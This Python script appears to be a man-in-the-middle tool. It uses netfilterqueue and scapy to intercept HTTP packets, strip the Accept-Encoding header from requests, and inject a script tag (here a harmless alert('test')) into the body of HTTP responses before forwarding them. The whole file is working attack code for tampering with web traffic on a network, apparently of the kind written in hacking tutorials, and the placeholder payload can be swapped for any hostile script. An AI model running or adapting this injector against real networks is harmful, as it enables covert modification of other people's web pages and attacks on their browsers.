#!/usr/bin/env python

from netfilterqueue import NetfilterQueue
from scapy.all import *

from scapy.layers.inet import *
from scapy.layers.inet6 import *
from scapy.layers.dns import *
from scapy.sendrecv import *
from scapy.supersocket import *
from scapy.layers.l2 import *
from scapy.layers.dot11 import *
from scapy.utils import *
from scapy.config import *
import re


ack_list = []


def set_load(scapy_packet, load):
    scapy_packet[Raw].load = load
    del scapy_packet[IP].len
    del scapy_packet[IP].chksum
    del scapy_packet[TCP].chksum
    return scapy_packet


def process_packet(nfq_packet):
    scapy_packet = IP(nfq_packet.get_payload())
    if scapy_packet.haslayer(Raw):  # looking for DNS Response, DNSRQ for DNS request
        if scapy_packet[TCP].dport == 80:
            print("[+] Request")
            modified_load = re.sub(r'Accept-Encoding:.*?\\r\\n', "", str(scapy_packet[Raw].load))
            new_packet = set_load(scapy_packet, modified_load)
            nfq_packet.set_payload(bytes(new_packet))
        elif scapy_packet[TCP].sport == 80:
            print("[+] Response")
            modified_load = str(scapy_packet[Raw].load).replace("</body>", "<script>alert('test')</script></body>")
            new_packet = set_load(scapy_packet, modified_load)
            new_packet.show()
            print(new_packet[Raw].load)
            nfq_packet.set_payload(bytes(new_packet))
    nfq_packet.accept()  # packet.drop() if you do not want to forward the packet ;)


queue = NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
